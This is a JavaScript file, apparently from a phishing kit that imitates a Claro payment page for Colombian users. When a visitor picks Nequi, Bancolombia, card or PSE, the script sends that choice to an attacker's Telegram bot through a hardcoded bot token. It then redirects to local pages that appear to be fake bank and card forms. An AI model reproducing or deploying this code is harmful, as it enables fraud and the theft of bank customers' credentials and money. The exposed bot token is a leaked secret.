async function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
    message
  )}`;

  try {
    const response = await fetch(url);
    if (response.ok) {
      console.log("Mensaje enviado a Telegram");
    } else {
      console.error("Error al enviar mensaje:", response.statusText);
    }
  } catch (error) {
    console.error("Error de red:", error);
  }
}

document
  .getElementById("nextStep")
  .addEventListener("click", async function () {
    document.getElementById("loader-container").style.display = "flex";

    const selectedOption = document.getElementById("paymentOptions").value;

    let message = "";
    if (selectedOption === "NEQ.png") {
      message = "🔵 Nequi (Claro)";
    } else if (selectedOption === "bancolombia.png") {
      message = "🟡 Bancolombia (Claro)";
    } else if (selectedOption === "FORMA_PAGO_2.png") {
      message = "🟠 Tarjeta (Claro)";
    } else if (selectedOption == "pse.png") {
      message = "🟣 PSE (Claro)";
    }

    if (message) {
      await sendToTelegram(message);
    }

    setTimeout(function () {
      if (selectedOption === "NEQ.png") {
        window.location.href = "./points/nequi/rastrear/indexwait.html";
      } else if (selectedOption === "bancolombia.png") {
        window.location.href = "./points/trico/home.html";
      } else if (selectedOption === "FORMA_PAGO_2.png") {
        window.location.href = "./tc.html";
      } else if (selectedOption == "pse.png") {
        window.location.href = "./ps.html";
      }
    }, 2000); // 2 segundos
  });
